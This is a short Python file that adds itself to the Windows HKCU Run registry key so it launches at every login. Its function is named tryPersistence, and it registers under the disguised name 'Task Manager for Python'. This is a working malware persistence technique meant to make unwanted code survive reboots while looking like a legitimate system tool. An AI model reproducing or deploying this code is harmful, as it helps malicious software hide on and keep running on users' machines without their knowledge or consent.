import os.path
import winreg

def create_key(name="default", path="") -> bool:
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0, winreg.KEY_WRITE)
    if not reg_key:
        return False
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, path)
    reg_key.Close()
    return True

def tryPersistence():
    if create_key("Task Manager for Python", str(os.path.realpath(__file__))):
        print("Start-Up Key Added.")
        return True
    else:
        print("Failed to add startup key.")
        return False
